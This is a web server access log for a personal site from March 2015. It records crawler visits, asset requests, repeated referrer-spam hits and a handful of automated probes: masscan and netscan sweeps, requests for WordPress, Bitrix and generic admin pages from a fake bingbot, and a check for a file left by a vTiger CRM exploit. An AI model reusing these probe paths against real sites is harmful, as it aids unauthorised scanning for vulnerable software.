199.116.169.254 - - [10/Mar/2015:20:59:26 +0000] "GET /assets/ HTTP/1.1" 403 579 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; InfoPath.1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; MS-RTC LM 8; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
199.116.169.254 - - [10/Mar/2015:20:59:26 +0000] "GET / HTTP/1.1" 200 3257 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; InfoPath.1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; MS-RTC LM 8; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
180.76.4.216 - - [10/Mar/2015:22:38:28 +0000] "GET / HTTP/1.1" 200 3257 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
182.118.54.52 - - [10/Mar/2015:23:50:05 +0000] "GET / HTTP/1.1" 200 1158 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36"
157.55.39.160 - - [11/Mar/2015:00:03:27 +0000] "GET / HTTP/1.1" 200 1158 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.73.243 - - [11/Mar/2015:00:23:53 +0000] "GET /rss/ HTTP/1.1" 304 0 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
180.76.4.58 - - [11/Mar/2015:00:40:11 +0000] "GET / HTTP/1.1" 200 3257 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
178.137.18.185 - - [11/Mar/2015:02:34:01 +0000] "GET / HTTP/1.1" 200 3257 "http://multiki-online24.ru/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Media Center PC"
178.137.18.185 - - [11/Mar/2015:02:34:01 +0000] "GET / HTTP/1.1" 200 3257 "http://onigama.com/" "Mozilla/4.0 (compatible; MSIE 5.01; Windows 95; MSIECrawler)"
178.137.18.185 - - [11/Mar/2015:02:34:01 +0000] "GET / HTTP/1.1" 200 3257 "http://multiki-online24.ru/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Media Center PC"
178.137.18.185 - - [11/Mar/2015:02:34:01 +0000] "GET / HTTP/1.1" 200 3257 "http://onigama.com/" "Mozilla/4.0 (compatible; MSIE 5.01; Windows 95; MSIECrawler)"
178.137.18.185 - - [11/Mar/2015:02:34:02 +0000] "GET / HTTP/1.1" 200 3257 "http://multiki-online24.ru/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Media Center PC"
178.137.18.185 - - [11/Mar/2015:02:34:02 +0000] "GET / HTTP/1.1" 200 3257 "http://onigama.com/" "Mozilla/4.0 (compatible; MSIE 5.01; Windows 95; MSIECrawler)"
180.76.4.155 - - [11/Mar/2015:02:45:34 +0000] "GET / HTTP/1.1" 200 3257 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
180.76.4.231 - - [11/Mar/2015:04:43:32 +0000] "GET / HTTP/1.1" 200 3257 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
123.125.71.85 - - [11/Mar/2015:05:25:02 +0000] "GET /assets/bundle.js HTTP/1.1" 200 73753 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
46.119.118.191 - - [11/Mar/2015:06:14:35 +0000] "GET / HTTP/1.1" 200 3257 "http://qualified-site.com/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows XP)"
46.119.118.191 - - [11/Mar/2015:06:14:35 +0000] "GET / HTTP/1.1" 200 3257 "http://ccpfy.net/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows XP)"
46.119.118.191 - - [11/Mar/2015:06:14:35 +0000] "GET / HTTP/1.1" 200 3257 "http://coldfilm.ru/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows XP)"
46.119.118.191 - - [11/Mar/2015:06:14:36 +0000] "GET / HTTP/1.1" 200 3257 "http://qualified-site.com/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows XP)"
46.119.118.191 - - [11/Mar/2015:06:14:36 +0000] "GET / HTTP/1.1" 200 3257 "http://ccpfy.net/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows XP)"
46.119.118.191 - - [11/Mar/2015:06:14:36 +0000] "GET / HTTP/1.1" 200 3257 "http://coldfilm.ru/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows XP)"
46.119.118.191 - - [11/Mar/2015:06:14:36 +0000] "GET / HTTP/1.1" 200 3257 "http://ccpfy.net/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows XP)"
46.119.118.191 - - [11/Mar/2015:06:14:36 +0000] "GET / HTTP/1.1" 200 3257 "http://qualified-site.com/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows XP)"
46.119.118.191 - - [11/Mar/2015:06:14:36 +0000] "GET / HTTP/1.1" 200 3257 "http://coldfilm.ru/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows XP)"
74.208.146.150 - - [11/Mar/2015:06:14:49 +0000] "GET /vtigercrm/test/upload/vtigercrm.txt HTTP/1.1" 200 3257 "-" "curl/7.19.7 (x86_64-redhat-linux-gnu) libcurl/7.19.7 NSS/3.16.2.3 Basic ECC zlib/1.2.3 libidn/1.18 libssh2/1.4.2"
176.8.89.30 - - [11/Mar/2015:06:15:38 +0000] "GET / HTTP/1.1" 200 3257 "http://jointpoint.org/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; InfoPath.1"
176.8.89.30 - - [11/Mar/2015:06:15:38 +0000] "GET / HTTP/1.1" 200 3257 "http://jointpoint.org/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; InfoPath.1"
176.8.89.30 - - [11/Mar/2015:06:15:39 +0000] "GET / HTTP/1.1" 200 3257 "http://jointpoint.org/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; InfoPath.1"
176.8.89.30 - - [11/Mar/2015:06:15:39 +0000] "GET / HTTP/1.1" 200 3257 "http://navro.org/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"
176.8.89.30 - - [11/Mar/2015:06:15:40 +0000] "GET / HTTP/1.1" 200 3257 "http://viktoria-center.ru/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"
176.8.89.30 - - [11/Mar/2015:06:15:40 +0000] "GET / HTTP/1.1" 200 3257 "http://navro.org/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"
176.8.89.30 - - [11/Mar/2015:06:15:40 +0000] "GET / HTTP/1.1" 200 3257 "http://viktoria-center.ru/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"
176.8.89.30 - - [11/Mar/2015:06:15:40 +0000] "GET / HTTP/1.1" 200 3257 "http://navro.org/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"
176.8.89.30 - - [11/Mar/2015:06:15:41 +0000] "GET / HTTP/1.1" 200 3257 "http://viktoria-center.ru/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"
180.76.4.155 - - [11/Mar/2015:06:40:30 +0000] "GET / HTTP/1.1" 200 3257 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
66.249.73.235 - - [11/Mar/2015:06:50:59 +0000] "GET /rss/ HTTP/1.1" 304 0 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
180.76.4.196 - - [11/Mar/2015:08:41:51 +0000] "GET / HTTP/1.1" 200 3257 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
128.61.240.66 - - [11/Mar/2015:08:42:53 +0000] "GET / HTTP/1.0" 200 3257 "-" "netscan.gtisc.gatech.edu"
178.137.18.185 - - [11/Mar/2015:10:16:50 +0000] "GET / HTTP/1.1" 200 3257 "http://wallpapers.red/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; MRA 4.6 (build 01425))"
178.137.18.185 - - [11/Mar/2015:10:16:50 +0000] "GET / HTTP/1.1" 200 3257 "http://wallpapers.red/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; MRA 4.6 (build 01425))"
178.137.18.185 - - [11/Mar/2015:10:16:51 +0000] "GET / HTTP/1.1" 200 3257 "http://wallpapers.red/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; MRA 4.6 (build 01425))"
180.76.4.114 - - [11/Mar/2015:10:44:48 +0000] "GET / HTTP/1.1" 200 3257 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
112.206.127.24 - - [11/Mar/2015:11:05:49 +0000] "GET / HTTP/1.1" 200 1158 "http://buttons-for-website.com" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
112.206.127.24 - - [11/Mar/2015:11:05:50 +0000] "GET /assets/bundle.css HTTP/1.1" 200 9878 "http://matthewellsworth.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
112.206.127.24 - - [11/Mar/2015:11:05:51 +0000] "GET /assets/bundle.js HTTP/1.1" 200 73753 "http://matthewellsworth.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
112.206.127.24 - - [11/Mar/2015:11:05:52 +0000] "GET /assets/flagship.otf HTTP/1.1" 200 52020 "http://matthewellsworth.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
112.206.127.24 - - [11/Mar/2015:11:05:52 +0000] "GET /assets/congruent_outline.png HTTP/1.1" 200 8425 "http://matthewellsworth.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
112.206.127.24 - - [11/Mar/2015:11:05:52 +0000] "GET /assets/adam.otf HTTP/1.1" 200 40496 "http://matthewellsworth.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
112.206.127.24 - - [11/Mar/2015:11:05:54 +0000] "GET /assets/glyphicons-halflings-regular.ttf HTTP/1.1" 200 41280 "http://matthewellsworth.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
157.55.39.160 - - [11/Mar/2015:11:31:28 +0000] "GET / HTTP/1.1" 200 1158 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
54.91.152.192 - - [11/Mar/2015:11:48:26 +0000] "HEAD / HTTP/1.1" 200 0 "-" "Cloud mapping experiment. Contact research@pdrlabs.net"
54.91.152.192 - - [11/Mar/2015:11:48:26 +0000] "GET /clientaccesspolicy.xml HTTP/1.1" 200 3257 "-" "Cloud mapping experiment. Contact research@pdrlabs.net"
66.249.69.12 - - [11/Mar/2015:12:07:19 +0000] "GET /robots.txt HTTP/1.1" 200 1158 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.69.28 - - [11/Mar/2015:12:07:19 +0000] "GET /rss/ HTTP/1.1" 200 1158 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
180.76.4.250 - - [11/Mar/2015:12:41:49 +0000] "GET / HTTP/1.1" 200 3257 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
66.249.69.245 - - [11/Mar/2015:12:52:52 +0000] "GET / HTTP/1.1" 200 1158 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.69.245 - - [11/Mar/2015:14:31:47 +0000] "GET /assets/bundle.css HTTP/1.1" 200 9878 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
180.76.4.9 - - [11/Mar/2015:14:38:33 +0000] "GET / HTTP/1.1" 200 3257 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
123.125.71.104 - - [11/Mar/2015:16:08:48 +0000] "GET / HTTP/1.1" 200 1158 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
220.181.108.105 - - [11/Mar/2015:16:13:08 +0000] "GET /assets/bundle.css HTTP/1.1" 200 50263 "http://matthewellsworth.com/" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
220.181.108.107 - - [11/Mar/2015:16:13:09 +0000] "GET /assets/adam.otf HTTP/1.1" 200 40496 "http://matthewellsworth.com/" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
220.181.108.99 - - [11/Mar/2015:16:13:09 +0000] "GET /assets/flagship.otf HTTP/1.1" 200 52020 "http://matthewellsworth.com/" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
220.181.108.97 - - [11/Mar/2015:16:13:09 +0000] "GET /assets/glyphicons-halflings-regular.ttf HTTP/1.1" 200 41280 "http://matthewellsworth.com/" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
220.181.108.119 - - [11/Mar/2015:16:13:28 +0000] "GET /assets/bundle.js HTTP/1.1" 200 213245 "http://matthewellsworth.com/" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
180.76.4.96 - - [11/Mar/2015:16:39:12 +0000] "GET / HTTP/1.1" 200 3257 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
66.249.69.245 - - [11/Mar/2015:17:22:15 +0000] "GET /rss/ HTTP/1.1" 304 0 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
50.12.37.108 - - [11/Mar/2015:17:24:01 +0000] "GET /MattEllsworth-Devops-Resume.pdf HTTP/1.1" 200 151973 "https://www.google.com/" "Mozilla/5.0 (X11; CrOS x86_64 6457.107.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
50.12.37.108 - - [11/Mar/2015:17:24:01 +0000] "GET /MattEllsworth-Devops-Resume.pdf HTTP/1.1" 206 32768 "http://matthewellsworth.com/MattEllsworth-Devops-Resume.pdf" "Mozilla/5.0 (X11; CrOS x86_64 6457.107.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
50.12.37.108 - - [11/Mar/2015:17:24:01 +0000] "GET /MattEllsworth-Devops-Resume.pdf HTTP/1.1" 206 119205 "http://matthewellsworth.com/MattEllsworth-Devops-Resume.pdf" "Mozilla/5.0 (X11; CrOS x86_64 6457.107.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
50.12.37.108 - - [11/Mar/2015:17:24:01 +0000] "GET /favicon.ico HTTP/1.1" 404 206 "-" "Mozilla/5.0 (X11; CrOS x86_64 6457.107.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36"
84.122.225.173 - - [11/Mar/2015:18:33:57 +0000] "GET / HTTP/1.1" 200 1158 "http://semalt.semalt.com/crawler.php?u=http://matthewellsworth.com" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
84.122.225.173 - - [11/Mar/2015:18:33:57 +0000] "GET /assets/bundle.css HTTP/1.1" 200 9878 "http://matthewellsworth.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
84.122.225.173 - - [11/Mar/2015:18:33:57 +0000] "GET /assets/congruent_outline.png HTTP/1.1" 200 8425 "http://matthewellsworth.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
84.122.225.173 - - [11/Mar/2015:18:33:57 +0000] "GET /assets/bundle.js HTTP/1.1" 200 73753 "http://matthewellsworth.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
84.122.225.173 - - [11/Mar/2015:18:33:57 +0000] "GET /assets/flagship.otf HTTP/1.1" 200 52020 "http://matthewellsworth.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
84.122.225.173 - - [11/Mar/2015:18:33:57 +0000] "GET /assets/adam.otf HTTP/1.1" 200 40496 "http://matthewellsworth.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
84.122.225.173 - - [11/Mar/2015:18:33:57 +0000] "GET /assets/glyphicons-halflings-regular.ttf HTTP/1.1" 200 41280 "http://matthewellsworth.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36"
180.76.4.245 - - [11/Mar/2015:18:46:02 +0000] "GET / HTTP/1.1" 200 3257 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
176.8.89.30 - - [11/Mar/2015:19:59:34 +0000] "GET / HTTP/1.1" 200 3257 "http://sexhd.tv/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) Opera 7.54 [en]"
176.8.89.30 - - [11/Mar/2015:19:59:34 +0000] "GET / HTTP/1.1" 200 3257 "http://sexhd.tv/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) Opera 7.54 [en]"
176.8.89.30 - - [11/Mar/2015:19:59:35 +0000] "GET / HTTP/1.1" 200 3257 "http://sexhd.tv/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) Opera 7.54 [en]"
46.119.118.191 - - [11/Mar/2015:20:01:05 +0000] "GET / HTTP/1.1" 200 3257 "http://777s.ru/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; MRA 4.6 (build 01425); MRSPUTNIK 1, 5, 0, 19 SW)"
46.119.118.191 - - [11/Mar/2015:20:01:05 +0000] "GET / HTTP/1.1" 200 3257 "http://777s.ru/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; MRA 4.6 (build 01425); MRSPUTNIK 1, 5, 0, 19 SW)"
46.119.118.191 - - [11/Mar/2015:20:01:06 +0000] "GET / HTTP/1.1" 200 3257 "http://777s.ru/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; MRA 4.6 (build 01425); MRSPUTNIK 1, 5, 0, 19 SW)"
61.240.144.67 - - [11/Mar/2015:20:24:25 +0000] "GET / HTTP/1.0" 200 3257 "-" "masscan/1.0 (https://github.com/robertdavidgraham/masscan)"
157.55.39.160 - - [11/Mar/2015:20:37:32 +0000] "GET /robots.txt HTTP/1.1" 200 3257 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
180.76.4.238 - - [11/Mar/2015:20:48:13 +0000] "GET / HTTP/1.1" 200 3257 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
157.55.39.160 - - [11/Mar/2015:20:55:36 +0000] "GET / HTTP/1.1" 200 1158 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
188.165.15.60 - - [11/Mar/2015:21:26:04 +0000] "GET /robots.txt HTTP/1.1" 200 1158 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)"
178.137.18.185 - - [11/Mar/2015:21:34:49 +0000] "GET / HTTP/1.1" 200 3257 "http://chcu.net/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
178.137.18.185 - - [11/Mar/2015:21:34:50 +0000] "GET / HTTP/1.1" 200 3257 "http://chcu.net/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
178.137.18.185 - - [11/Mar/2015:21:34:50 +0000] "GET / HTTP/1.1" 200 3257 "http://chcu.net/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
46.118.127.50 - - [11/Mar/2015:21:40:30 +0000] "GET /robots.txt HTTP/1.1" 200 3257 "-" "Mozilla/5.0 (compatible; bingbot/3.0-alpha; +http://www.bing.com/bingbot.htm)"
46.118.127.50 - - [11/Mar/2015:21:40:30 +0000] "GET /wp-login.php HTTP/1.1" 404 177 "-" "Mozilla/5.0 (Windows NT 6.1; rv:36.0) Gecko/20100101 Firefox/36.0"
46.118.127.50 - - [11/Mar/2015:21:40:30 +0000] "GET /robots.txt HTTP/1.1" 200 3257 "-" "Mozilla/5.0 (compatible; bingbot/3.0-alpha; +http://www.bing.com/bingbot.htm)"
46.118.127.50 - - [11/Mar/2015:21:40:30 +0000] "GET /admin/index.php HTTP/1.1" 404 177 "-" "Mozilla/5.0 (compatible; bingbot/3.0-alpha; +http://www.bing.com/bingbot.htm)"
46.118.127.50 - - [11/Mar/2015:21:40:30 +0000] "GET /bitrix/admin/index.php?lang=en HTTP/1.1" 404 177 "-" "Mozilla/5.0 (compatible; bingbot/3.0-alpha; +http://www.bing.com/bingbot.htm)"
46.118.127.50 - - [11/Mar/2015:21:40:30 +0000] "GET /robots.txt HTTP/1.1" 200 3257 "-" "Mozilla/5.0 (compatible; bingbot/3.0-alpha; +http://www.bing.com/bingbot.htm)"
46.118.127.50 - - [11/Mar/2015:21:40:31 +0000] "GET /robots.txt HTTP/1.1" 200 3257 "-" "Mozilla/5.0 (compatible; bingbot/3.0-alpha; +http://www.bing.com/bingbot.htm)"
46.118.127.50 - - [11/Mar/2015:21:40:31 +0000] "GET /robots.txt HTTP/1.1" 200 3257 "-" "Mozilla/5.0 (compatible; bingbot/3.0-alpha; +http://www.bing.com/bingbot.htm)"
180.76.4.90 - - [11/Mar/2015:22:42:03 +0000] "GET / HTTP/1.1" 200 3257 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
46.118.127.50 - - [11/Mar/2015:22:57:17 +0000] "GET / HTTP/1.1" 200 3257 "-" "Opera/9.80 (Android; Opera Mini/7.5.33361/31.1543; U; en) Presto/2.8.119 Version/11.1010"
66.249.69.245 - - [11/Mar/2015:23:47:59 +0000] "GET /rss/ HTTP/1.1" 304 0 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
85.18.173.109 - - [12/Mar/2015:00:01:45 +0000] "HEAD / HTTP/1.0" 200 0 "-" "-"
180.76.4.8 - - [12/Mar/2015:00:40:13 +0000] "GET / HTTP/1.1" 200 3257 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
195.242.218.133 - - [12/Mar/2015:01:35:37 +0000] "GET / HTTP/1.1" 200 3257 "http://doska-vsem.ru/" "Mozilla/3.0 (x86 [en] Windows NT 5.1; Sun)"
195.242.218.133 - - [12/Mar/2015:01:35:39 +0000] "GET / HTTP/1.1" 200 3257 "http://doska-vsem.ru/" "Mozilla/3.0 (x86 [en] Windows NT 5.1; Sun)"
195.242.218.133 - - [12/Mar/2015:01:35:42 +0000] "GET / HTTP/1.1" 200 3257 "http://doska-vsem.ru/" "Mozilla/3.0 (x86 [en] Windows NT 5.1; Sun)"
50.56.228.100 - - [12/Mar/2015:01:57:38 +0000] "GET / HTTP/1.1" 200 1158 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:35.0) Gecko/20100101 Firefox/35.0"
50.56.228.100 - - [12/Mar/2015:01:57:39 +0000] "GET /assets/bundle.css HTTP/1.1" 200 9878 "http://matthewellsworth.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:35.0) Gecko/20100101 Firefox/35.0"
50.56.228.100 - - [12/Mar/2015:01:57:39 +0000] "GET /assets/bundle.js HTTP/1.1" 200 73753 "http://matthewellsworth.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:35.0) Gecko/20100101 Firefox/35.0"
50.56.228.100 - - [12/Mar/2015:01:57:39 +0000] "GET /assets/congruent_outline.png HTTP/1.1" 200 8425 "http://matthewellsworth.com/assets/bundle.css" "Mozilla/5.0 (X11; Linux x86_64; rv:35.0) Gecko/20100101 Firefox/35.0"
50.56.228.100 - - [12/Mar/2015:01:57:39 +0000] "GET /assets/glyphicons-halflings-regular.woff HTTP/1.1" 200 23320 "http://matthewellsworth.com/assets/bundle.css" "Mozilla/5.0 (X11; Linux x86_64; rv:35.0) Gecko/20100101 Firefox/35.0"
50.56.228.100 - - [12/Mar/2015:01:57:39 +0000] "GET /assets/adam.otf HTTP/1.1" 200 40496 "http://matthewellsworth.com/assets/bundle.css" "Mozilla/5.0 (X11; Linux x86_64; rv:35.0) Gecko/20100101 Firefox/35.0"
50.56.228.100 - - [12/Mar/2015:01:57:39 +0000] "GET /assets/flagship.otf HTTP/1.1" 200 52020 "http://matthewellsworth.com/assets/bundle.css" "Mozilla/5.0 (X11; Linux x86_64; rv:35.0) Gecko/20100101 Firefox/35.0"
50.56.228.100 - - [12/Mar/2015:01:57:39 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:35.0) Gecko/20100101 Firefox/35.0"
50.56.228.100 - - [12/Mar/2015:01:57:39 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:35.0) Gecko/20100101 Firefox/35.0"
50.56.228.100 - - [12/Mar/2015:01:57:47 +0000] "GET /posts/WorkInProgress__Github_Webhooks_to_call_salt_highState HTTP/1.1" 200 1158 "http://matthewellsworth.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:35.0) Gecko/20100101 Firefox/35.0"
50.56.228.100 - - [12/Mar/2015:01:57:47 +0000] "GET /assets/bundle.css HTTP/1.1" 200 9878 "http://matthewellsworth.com/posts/WorkInProgress__Github_Webhooks_to_call_salt_highState" "Mozilla/5.0 (X11; Linux x86_64; rv:35.0) Gecko/20100101 Firefox/35.0"
50.56.228.100 - - [12/Mar/2015:01:57:47 +0000] "GET /assets/congruent_outline.png HTTP/1.1" 200 8425 "http://matthewellsworth.com/assets/bundle.css" "Mozilla/5.0 (X11; Linux x86_64; rv:35.0) Gecko/20100101 Firefox/35.0"
50.56.228.100 - - [12/Mar/2015:01:57:47 +0000] "GET /assets/bundle.js HTTP/1.1" 200 73753 "http://matthewellsworth.com/posts/WorkInProgress__Github_Webhooks_to_call_salt_highState" "Mozilla/5.0 (X11; Linux x86_64; rv:35.0) Gecko/20100101 Firefox/35.0"
199.116.169.254 - - [12/Mar/2015:01:58:47 +0000] "GET /assets/glyphicons-halflings-regular.woff HTTP/1.1" 200 23320 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; InfoPath.1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; MS-RTC LM 8; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
199.116.169.254 - - [12/Mar/2015:01:58:47 +0000] "GET /assets/adam.otf HTTP/1.1" 200 40496 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; InfoPath.1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; MS-RTC LM 8; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
50.56.228.100 - - [12/Mar/2015:01:58:55 +0000] "GET / HTTP/1.1" 200 1158 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:35.0) Gecko/20100101 Firefox/35.0"
50.56.228.100 - - [12/Mar/2015:01:58:55 +0000] "GET /assets/bundle.css HTTP/1.1" 200 9878 "http://matthewellsworth.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:35.0) Gecko/20100101 Firefox/35.0"
50.56.228.100 - - [12/Mar/2015:01:58:55 +0000] "GET /assets/bundle.js HTTP/1.1" 200 73753 "http://matthewellsworth.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:35.0) Gecko/20100101 Firefox/35.0"
50.56.228.100 - - [12/Mar/2015:01:58:55 +0000] "GET /assets/congruent_outline.png HTTP/1.1" 200 8425 "http://matthewellsworth.com/assets/bundle.css" "Mozilla/5.0 (X11; Linux x86_64; rv:35.0) Gecko/20100101 Firefox/35.0"
